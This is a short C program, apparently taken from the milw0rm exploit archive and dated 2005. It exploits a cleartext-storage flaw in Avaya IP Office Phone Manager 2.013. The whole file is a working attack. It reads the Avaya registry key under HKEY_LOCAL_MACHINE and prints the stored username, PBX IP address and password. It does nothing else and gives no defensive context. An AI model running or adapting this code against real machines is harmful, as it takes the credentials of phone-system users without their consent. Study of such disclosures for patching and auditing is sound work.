#include <windows.h>
#include <stdio.h>
#include <string.h>

/*
               Filename:               exploit.c
               Title:          Avaya IP Office Phone Manager - Cleartext Sensitive Data Vulnerability Exploit v0.01
               Author:         pagvac (Adrian Pastor)
               Date:                   24th Feb, 2005
               Other info:             tested on version 2.013. Compile as a Win32 console application project in Visual C++
*/

BOOL QueryVal(char lszVal2Query[255], char lszValData[255])
{
    char lszResult[255];
    HKEY hKey;
    LONG returnStatus;
    DWORD dwType=REG_SZ;
    DWORD dwSize=255;
    returnStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\AVAYA\\IP400\\GENERIC", 0L, KEY_READ, &hKey);

        if (returnStatus == ERROR_SUCCESS)
    {
                returnStatus = RegQueryValueEx(hKey, lszVal2Query, NULL, &dwType,(LPBYTE)&lszResult, &dwSize);
         if (returnStatus == ERROR_SUCCESS)
         {
                          strcpy(lszValData, lszResult);
         }
                 RegCloseKey(hKey);
                 return TRUE;
    }
        else
        {
                RegCloseKey(hKey);
                return FALSE;
    }
}

void main()
{
       char valData[255];

       printf("\nAvaya IP Office Phone Manager - Cleartext Sensitive Data Vulnerability Exploit\n");
       printf("By pagvac (Adrian Pastor)\n");
       printf("Tested on version 2.013\n\n");

       // Print username
       printf("Username:\t");
       if(!QueryVal("UserName", valData))
               printf("Error! No permissions to read key value?\n");
       else
               printf("%s\n", valData);

       // Print IP address
       printf("PBX IP Address:\t");
       if(!QueryVal("PBXAddress", valData))
               printf("Error! No permissions to read key value?\n");
       else
               printf("%s\n", valData);

       // Print password
       printf("Password:\t");
       if(!QueryVal("Password", valData))
               printf("Error! No permissions to read key value?\n");
       else
       {

               if(strcmp(valData, "")==0)
                       printf("[blank password]\n\n");
               else
               {
                       printf("%s\n", valData);
                       printf("Password obsfucated?\n\n");
               }
       }

}

// milw0rm.com [2005-02-24]
